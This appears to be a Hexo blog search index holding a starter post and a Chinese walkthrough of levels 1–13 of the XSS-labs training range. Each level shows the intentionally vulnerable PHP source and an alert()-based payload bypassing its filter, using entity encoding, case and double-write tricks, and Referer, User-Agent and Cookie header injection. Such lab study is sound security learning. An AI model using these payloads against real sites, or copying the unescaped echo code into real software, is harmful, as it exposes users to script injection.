<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2022/10/15/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
</code></pre>
<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
</code></pre>
<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
</code></pre>
<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
</code></pre>
<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="XSS-labs通关笔记"><a href="#XSS-labs通关笔记" class="headerlink" title="XSS-labs通关笔记"></a>XSS-labs通关笔记</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911140948713.png" alt="image-20220911140948713"></p>
<p>我们可以看到这里将name的参数值，插入到了<h2> </h2>中，这里就是反射型xss，直接给name重新赋值。</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911141228367.png" alt="image-20220911141228367"></p>
<p>服务器并没有进行任何的过滤，我们可以看看服务器端</p>
<h4 id="服务器端源代码"><a href="#服务器端源代码" class="headerlink" title="服务器端源代码"></a>服务器端源代码</h4><p><code>&lt;/script&gt;</code></p>
<p><code>&lt;title&gt;欢迎来到level1&lt;/title&gt;</code></p>
<p><code>&lt;/head&gt;</code></p>
<p><code>&lt;body&gt;</code></p>
<p><code>&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;name&quot;];</code>                                                         <strong>&#x2F;&#x2F;这里将name赋值给了str</strong></p>
<p><code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>       <strong>&#x2F;&#x2F;这里直接将str插入了标签之间,导致反射型xss形成</strong></p>
<p>**<code>?&gt;**</code></p>
<p><code>&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p><code>&lt;/body&gt;</code></p>
<p><code>&lt;/html&gt;</code></p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911143003578.png" alt="image-20220911143003578"></p>
<p>可以发现，通过get传参提交，经过服务器的动态处理之后又会将参数keyword的值插入到<code>&lt;h2&gt; &lt;/h2&gt;</code>标签之中以及</p>
<p>添加到<code>&lt;input&gt;</code>标签中的value属性的值内。</p>
<p>我们尝试用上关的payload提交</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911143415145.png" alt="image-20220911143415145"></p>
<p>可以看到，在<code>&lt;h2&gt; &lt;/h2&gt;</code>标签之中的恶意代码被编码了，其中<code>&lt;</code>和<code>&gt;</code>都被编码成了html字符实体，猜测在服务器端用<code>htmlspecialchars()函数</code>对keyword参数的值进行了处理，接着往下看可以看到插入到value参数值中的恶意代码并没有被编码而是直接原样返回，但是问题是这里的js代码在标签属性值中，浏览器是无法执行的，既然上面的恶意代码被编码了，那么只能从属性值中的恶意代码处进行突破了。</p>
<p>要想浏览器执行这里的弹窗代码，只需要<strong>将属性的引号和标签先闭合</strong>就可以了</p>
<p>用”&gt;闭合前面的&lt;input，再用&#x2F;&#x2F;将后面的”注释掉。</p>
<p><strong>payload：</strong><code>n3ym4r&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//</code></p>
<h4 id="服务器端源代码-1"><a href="#服务器端源代码-1" class="headerlink" title="服务器端源代码"></a>服务器端源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code><strong>&#x2F;&#x2F;将get方式传递到服务器端的keyword参数的值赋给str变量</strong></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p> <strong>&#x2F;&#x2F;用<code>htmlspecialchars()函数</code>对变量str进行处理之后显示到网页上</strong></p>
<p><code>&lt;form action=level2.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code><strong>&#x2F;&#x2F;直接将变量值插入到了<code>&lt;input&gt;</code>标签的value属性值中</strong></p>
<p><code>&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p><code>&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>简单测试，发现与第二关相比，这里将属性值这里也进行了<code>htmlspecialchars()</code>函数处理。</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911145010616.png" alt="image-20220911145010616"></p>
<p>这里，无法使用标签，因为标签都是带有&lt;&gt;符号的，就会被转义。但该函数不会转义单引号，可以采用<strong>事件</strong>闭合标签。</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p> <code>&#39; onclick=&#39;alert(1)</code>&#x2F;&#x2F;当单击鼠标时运行脚本</p>
<p><code>&#39; onmouseover=&#39;alert(1)</code>&#x2F;&#x2F;当鼠标指针移至元素之上时运行脚本</p>
<h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</code></p>
<p><code>&lt;form action=level3.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;</code>   </p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars ()"></a>htmlspecialchars ()</h4><p>将特殊字符转换为html实体</p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911150558305.png" alt="image-20220911150558305"></p>
<p>可以看到&lt;&gt;符号被替换成了空</p>
<p>但是事件不需要用到&lt;&gt;，所以直接用<strong>鼠标事件</strong>插入</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>&quot; onmouseover=&quot;alert(/xss/)</code></p>
<p>我们还是同样需要闭合他原来的语句。</p>
<h4 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</code> </p>
<p><code>$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</code><strong>&#x2F;&#x2F;将&lt;&gt;替换为空</strong></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level4.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><h4 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p>
<p><code>$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</code></p>
<p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level5.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到将&lt;script替换为了&lt;scr_ipt,同时也将on替换为了o_n,这使得我们无法通过<code>&lt;script&gt;</code>标签或触发事件来执行js代码，那么我们可以换个标签，使用<strong>a标签的js伪协议实现href属性</strong>支持javascript:伪协议构造poc 产生一个链接</p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><strong><code>&quot;&gt; &lt;a href=javascript:alert(&#39;xss&#39;) &gt; xss&lt;/a&gt; //</code></strong></p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><h4 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</code><strong>&#x2F;&#x2F;限制&lt;script恶意代码</strong></p>
<p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code><strong>&#x2F;&#x2F;限制带on的事件</strong></p>
<p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code><strong>&#x2F;&#x2F;限制图片<img>标签，&lt;img src&#x3D;111 onerror&#x3D;alert(‘xss’)&gt;</strong></p>
<p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code><strong>&#x2F;&#x2F;data:对字符编码的一种设定</strong></p>
<p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code><strong>&#x2F;&#x2F;限制通过在href属性中插入js代码来点击执行</strong></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level6.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到做了很多限制，但是都是判断的整个字符，我们可以<strong>大小写绕过</strong></p>
<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>&quot;&gt;&lt;sCrIpt&gt;alert(/xss/)&lt;/ScRipt&gt;</code></p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><h4 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str =strtolower( $_GET[&quot;keyword&quot;]);</code></p>
<p><code>$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</code><strong>&#x2F;&#x2F;将script替换为空，以下同理</strong></p>
<p><code>$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</code></p>
<p><code>$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</code></p>
<p><code>$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</code></p>
<p><code>$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level7.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>因为只会对整个字符串进行一次替换，所以我们可以使用<strong>双写绕过</strong></p>
<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;</code></p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><h4 id="源代码-5"><a href="#源代码-5" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p>
<p><code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code></p>
<p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p>
<p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p>
<p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p>
<p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p>
<p><code>$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</code></p>
<p><code>echo &#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level8.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=添加友情链接 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p><code>&lt;?php</code></p>
<p> <code>echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;</code> <strong>&#x2F;&#x2F;在这里进行拼接</strong></p>
<p><code>?&gt;</code></p>
<p><code>&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到将大部分能用到的字符都做了破坏，看到友情链接那里，我们可以使用编码的方式绕过</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911155344507.png" alt="image-20220911155344507"></p>
<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;</code></p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><h4 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h4><pre><code>&lt;?php 

ini_set(&quot;display_errors&quot;, 0);

$str = strtolower($_GET[&quot;keyword&quot;]);

$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);

$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);

$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);

$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);

$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);

$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);

echo &#39;&lt;center&gt;

&lt;form action=level9.php method=GET&gt;

&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;

&lt;input type=submit name=submit value=添加友情链接 /&gt;

&lt;/form&gt;

&lt;/center&gt;&#39;;

?&gt;

&lt;?php

if(false===strpos($str7,&#39;http://&#39;))  

&#123;

 echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;

   &#125;

else

&#123;

 echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;

&#125;

?&gt;

&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;

&lt;?php 

echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;

?&gt;
</code></pre>
<p>if(false&#x3D;&#x3D;&#x3D;strpos($str7,’http:&#x2F;&#x2F;‘))  判断是否包含http:&#x2F;&#x2F;然后返回,这里还是可以通过编码来绕过</p>
<h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h4><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911184437126.png" alt="image-20220911184437126"></p>
<p>可以看到有三个input标签，我们得测试出哪个表单可以突破</p>
<p>构造语句：<code>?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;</code></p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911185059255.png" alt="image-20220911185059255"></p>
<p>t_sort时，出现一个输入框，所以我们可以确定了</p>
<h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h4><p><code>?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
<h4 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h4><p>我们可以再看看源代码</p>
<p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str11 = $_GET[&quot;t_sort&quot;];</code></p>
<p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p>
<p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form id=search&gt;</code></p>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到，我们的猜测没错,值得注意的是，这里会将&lt;&gt;替换为空，不能通过闭合input，引入新的标签来触发，只能通过事件来触发。</p>
<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><h4 id="源代码-8"><a href="#源代码-8" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str00 = $_GET[&quot;t_sort&quot;];</code></p>
<p><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code></p>
<p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p>
<p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form id=search&gt;</code></p>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>这一关卡和上面的一关非常的像多了一个input表单的信息，在服务器端还将请求头中的referer头的值赋给了str11这个变量，$_SERVER[‘HTTP_REFERER’]  #链接到当前页面的前一页面的 URL 地址，也就是说这里可以做点文章。在将变量值中的&lt;和&gt;删除之后就会插入到t_ref这个标签的<strong>value</strong>属性值中。而上一关的t_sort标签虽然也能接收并显示参数值，但是这个参数值是要用htmlspecialchars()函数处理的。</p>
<p>这里，我们就可以抓包，将数据包中的referer改为我们的恶意代码</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911190554237.png" alt="image-20220911190554237"></p>
<h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h4><p><code>referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911191107302.png" alt="image-20220911191107302"></p>
<p>查看网页源码，我们发现，有一个和ua头一样的参数值，我们可以大胆猜测，这关测试点就在ua头，抓包改包试试</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911191512274.png" alt="image-20220911191512274"></p>
<p>成功</p>
<h4 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h4><p><code>User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
<h4 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str00 = $_GET[&quot;t_sort&quot;];</code></p>
<p><code>$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];</code></p>
<p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p>
<p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form id=search&gt;</code></p>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>将keyword参数的值赋给了变量str</p>
<p>将t_sot参数的值赋给了变量str00，</p>
<p>将请求中User-Agent头的值赋给了变量str11,。</p>
<p>将变量str11的值中存在的&lt;和&gt;删除之后直接插入到了t_ua标签的value</p>
<p>属性值中。</p>
<p>在这里变量str和str00的值都是需要被htmlspecialchars()函数处理过</p>
<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>13关猜测还是与数据头有关</p>
<p><img src="https://img-blog.csdnimg.cn/2020072419061647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911203242098.png" alt="image-20220911203242098"></p>
<p>可以看到，是将cookies里的值放入了t_cook中，修改为恶意代码</p>
<h4 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h4><p><code>Cookie: user=1&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;</code></p>
<h4 id="源代码-10"><a href="#源代码-10" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</code></p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str00 = $_GET[&quot;t_sort&quot;];</code></p>
<p><code>$str11=$_COOKIE[&quot;user&quot;];</code></p>
<p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p>
<p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form id=search&gt;</code></p>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
